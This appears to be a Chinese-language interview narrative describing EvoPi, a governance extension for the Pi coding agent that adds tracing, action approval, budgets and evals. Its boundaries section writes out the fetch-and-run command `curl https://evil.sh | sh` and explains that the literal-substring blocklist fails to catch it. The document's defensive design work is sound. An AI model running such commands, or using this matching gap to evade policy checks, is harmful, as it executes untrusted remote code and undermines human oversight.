# EvoPi · 面试叙事

> 这份文档是给自己（和面试官）的「弹药库」：EvoPi 到底解决什么问题、我做了哪些关键技术决策、踩过哪些真坑、怎么定的边界。
> 不是功能清单（那在 [README](../../README.md) 和[设计文档](.)里），这里讲**判断和取舍**。

---

## 一、一句话与电梯陈述

**一句话**：EvoPi 在不改 Pi 编码 agent 内核的前提下，用它的生命周期钩子给它套上一圈治理——让一个「能干活的 agent」变成一个「能被观测、能被管住、可信」的 agent。

**30 秒电梯陈述**：
> 现在的编码 agent 很能干，但你不太敢让它无人值守地跑——它可能 `rm -rf`、可能把预算烧穿、可能加载一个来路不明的 skill。EvoPi 的思路是：不 fork Pi、不改它一行核心代码，而是作为一个扩展挂在它的生命周期钩子上，做六件事——观测（统一事件流）、成本（缓存命中率/上下文压力）、记忆、执行准入（高危动作要审批，无人值守时直接挡）、工具运行时（错误分类/预算）、评测（确定性打分 + 半自动门禁）。核心的设计约束是「不改底座、安全优先、保守默认」。

---

## 二、为什么是「治理」这个切入点

选题不是「再造一个 agent」，而是「给已有的强 agent 补上工程化的一环」。理由：

1. **真实痛点**：agent 越强，"敢不敢放开手"就越是瓶颈。治理（guardrails / observability / evals）是让 agent 从"玩具/助手"走向"生产可用"的必经关卡，也是当前业界正在集中投入的方向。
2. **不重复造轮子**：Pi 已经把"对话/工具/session tree/缓存/子代理"做得很好。与其重写，不如**站在它的肩膀上补差异化价值**——这本身就是一个工程判断：识别"什么该复用、什么才是我的增量"。
3. **约束催生设计**："不改 Pi 内核"是我给自己定的硬约束。它逼出了整个架构：一切能力都必须能通过**已有的钩子**表达出来。做不到的（比如包裹单个内置工具的执行）就诚实地留到 V2，而不是去改底座。

## 三、关键技术决策（可展开讲的「深度」）

### 决策 1：Trace 作底座，其余模块都是它的消费者

不让六个模块各写各的日志，而是先建**一条统一事件流**（`trace.ts`），每次运行分配一个 `traceId`，所有模块的事件都是它的扩展、双写 JSONL + session anchor。

- **为什么**：治理的前提是"看得见"。统一事件流让成本、执行、评测共享同一套观测底座，下游（SQLite / 看板 / V2 自动化）只依赖一份稳定的事件 schema。
- **可讲的点**：这是典型的"先建基础设施再建功能"的取舍——短期慢一点，长期六个模块都受益、且互相不打架。

### 决策 2：Anchor-only —— 什么写进 session，什么只进日志

Pi 的 session tree 是会被带进上下文、影响后续对话的。如果每个观测事件都写进 session，会**污染上下文、烧 token**。所以我定了一条判据：

- **只有**「资产产生 / 审批 / 关键治理决策」写 session anchor（`memory.write` / `skill.approved` / `policy.approved·denied·blocked` / `job.*` / `eval.gate·candidate`）；
- 逐次观测（`cost.*` / `tool.result` / `policy.check` / `*.retrieve`）**只进 JSONL**。

- **可讲的点**：这是一个"可观测性 vs 上下文成本"的权衡。我甚至为此在实现期做过一次收敛（把最初 MVP 里"每个事件都 append 到 session"改成默认只进 JSONL），并把这次改动记进了变更日志——因为它不改事件字段、只改落点，所以不算破坏冻结契约。

### 决策 3：单一 `tool_call` handler，"安全 > 资源"

模块 4（执行准入）和模块 5（工具预算）都想在 `tool_call` 时介入。我没有让它们各注册一个 handler，而是**合并成一个**，在里面**先跑安全决策（block 立即返回），再跑预算决策**。

- **为什么**：多个 handler 的执行顺序在 Pi 里是"全执行、最后一个非 undefined 生效"——如果分开注册，顺序陷阱会导致"既高危又超预算时到底按哪个拦"变得不确定。合并后我能显式保证：**既高危又超预算，取安全原因**。这条我专门写了接线测试确证。
- **可讲的点**：这是"用架构消除歧义"的例子——把一个隐晦的顺序依赖，变成一段读得懂、测得了的显式逻辑。

### 决策 4：保守默认 —— 策略缺失/坏配置不许"放开"

共享策略 `policy.json` 缺失、字段缺失、甚至是坏 JSON 时，一律**退回内置保守默认**（总能拦高危），而且加载是**合并而非替换**——用户只想覆盖一个键，其它键仍有默认。

- **为什么**：安全配置的默认方向必须是"关"。一个常见的坑是"配置漏写一项 → 那项被完全放开"。合并语义堵死了这条路。
- **可讲的点**：这条有测试钉住（[tests/policy.test.ts](../../tests/policy.test.ts) 里"用户只覆盖一个键，rm -rf 仍被拦"）。

### 决策 5：评分不猜 + 半自动棘轮

评测（模块 6）用**确定性 check**（命令退出码 / 文件是否改动 / 输出是否含标记 / 是否碰禁区）打分，解析失败/执行失败一律标"无效"而**不猜**。技能的"自进化"用**半自动棘轮**：`replay` 跑全量对比 baseline、展示但**不自动裁决**，最后由人 `gate enable|reject` 拍板。

- **为什么**：让 agent 自己给自己打模糊分、自己决定"我进化好了"是危险的。确定性 + 人在关键节点拍板，是 V1 该有的保守度；全自动门禁留 V2。

## 四、三个真坑（最好的"深度"素材，每个都定位到源码根因）

这三个坑是在把"离线自测"升级成"真 Pi + 真模型端到端跑通"时踩的。价值在于：**每个都不是猜的，是读 Pi 源码定位到根因、并固化成可复现脚本的。**

### 坑 1：扩展死活加载不了 → 根因是「信任门控」

**现象**：`pi --print --mode json` 跑完，`.pi/evopi/traces/` 里空空如也，扩展像没加载。

**排查到根因**：读 Pi 源码链路——
- `main.ts`：`--print` / `--mode json` 属于**非交互模式**，`trustPromptMode` 非 `"interactive"` → `hasUI=false` → 项目信任默认 **false**；
- `core/package-manager.ts` 的 `addAutoDiscoveredResources`：**只在 `projectTrusted===true` 时**才加载项目级 `.pi/extensions`——否则**完全跳过**。

**解法**：加 `--approve`（`projectTrustOverride=true`）。验证证据：产出的 `session.start` 事件里 `data.trusted: true`。

**可讲的点**：这是"现象离根因很远"的经典案例——表面是"扩展没加载"，根因是"非交互模式的安全默认把它挡了"。也顺带印证了我自己模块 4 的设计哲学（保守默认、无 UI 时更严）其实和 Pi 内核一脉相承。

### 坑 2：后台进程直接卡死 → 根因是「stdin 死锁」

**现象**：在 PowerShell 里把 Pi 作为后台进程跑，它不报错、不退出，就是**挂住**。

**排查到根因**：`main.ts` 里，仅当 `stdin.isTTY` 为真才跳过读 stdin；非 TTY 时它会 `process.stdin.resume()` **阻塞等 EOF**。而后台进程的 stdin 既不是 TTY、又永远不结束 → 死锁。

**解法**：prompt 从 **stdin 管道**喂入（`"prompt" | tsx ... cli.ts --print`），管道关闭即 EOF。
**附带坑**：PowerShell 管道传中文会丢成 `?`，所以验证 prompt 用英文。

**可讲的点**：TTY / 非 TTY 的行为差异是 CLI 工具的常见暗礁。这个坑说明"能在终端手动跑通"和"能在自动化/CI 里跑通"是两回事。

### 坑 3：扩展加载器缺失 → 根因是「jiti 没装」

**现象**：即使信任对了，扩展仍加载失败。

**排查到根因**：`D:\evopi\pi` 初始 `node_modules` 不完整（`.bin` 空）。而 `core/extensions/loader.ts` 用 **`createJiti`** 来即时编译扩展的 TypeScript——`jiti` 缺了，扩展的 `.ts` 根本没法被加载运行；`tsx` 缺了，官方的免构建入口（`pi-test.sh`）也跑不起来。

**解法**：在 `pi/` 跑 `npm install`（写入 `pi/node_modules`，已 gitignore，不改 Pi 源码）。

**可讲的点**：这解释了一个"看似矛盾"的现象——Pi 明明能跑对话，但加载不了 TS 扩展。因为对话走的是已编译的入口，扩展走的是 jiti 的运行时编译，两条路径的依赖不一样。

> 三个坑的完整根因 + 可复现脚本见 [impl/e2e-验证/](impl/e2e-验证/)。

## 五、我怎么定边界（"没做什么"也是判断）

诚实标注"没做/做不到"，是这个项目我最想让人看到的工程素养：

- **工具级超时（AbortController）改 V2**：我想给单个工具调用套超时，但读了 Pi 的扩展 API 后确认——`tool_call` 钩子**不暴露单工具的 AbortController**（`ctx.signal` 是整轮的，`ctx.abort()` 会中断整个 agent），也没有"包裹内置工具执行"的 API（`registerTool` 只能定义新工具，不能 wrap 内置 bash/read）。所以 V1 不硬做，靠 bash 原生 `timeout` 兜底，把它明确记进变更日志留 V2。
- **默认 policy 的 `curl … | sh` 会漏判**：我的测试暴露了默认黑名单是**字面子串**匹配，`curl https://evil.sh | sh` 里没有连续的 `curl | sh` 子串 → 漏判。我没有偷偷改掉它假装无事，而是用一条[诚实的测试断言](../../tests/policy.test.ts)把这个缺口钉住，记为待 V2 收紧为正则。
- **真 Pi 触发的事件覆盖不全**：端到端只跑通了纯文本对话那条路径（生命周期 + `cost.request` 真实 usage）；`tool.call` / `policy.*` / `compact.*` 的**真 Pi 触发**尚未全部录取——但它们的逻辑与写盘路径已被离线测试覆盖。这个边界我在 README 和进度表里都明确标了。

## 六、如果继续做（V2 方向）

每个模块 V1 都留了接口位：Cost 主动缓存策略、技能自进化的全自动棘轮、执行的自动 rewind、工具的 MCP + 沙箱、Eval 的全自动门禁。以及上面三条边界的收口（工具级超时、策略正则化、补齐真 Pi 事件触发）。

## 附：可能被追问的问题（自测）

- **「为什么不 fork Pi 直接改？」** → 见决策起点（二）：不改底座是硬约束，它逼出了整个"钩子化"架构，也让 EvoPi 能跟随上游 Pi 升级而不用维护 fork。
- **「测试为什么不用 jest？」** → 扩展零运行时依赖，测试保持同哲学：手写极简断言器 + 借 Pi 的 tsx 跑真码，`npm test` 不受框架版本漂移影响。见 [tests/README.md](../../tests/README.md)。
- **「怎么证明它不是纸上谈兵？」** → 三层证据：49 个跑真码的测试、真码驱动的 [demo](../../demo/)、真 Pi + 真模型的[端到端记录](impl/e2e-验证/)。
- **「安全和资源冲突时听谁的？」** → 单一 tool_call handler 里安全先行，"既高危又超预算取安全原因"，有接线测试确证（决策 3）。
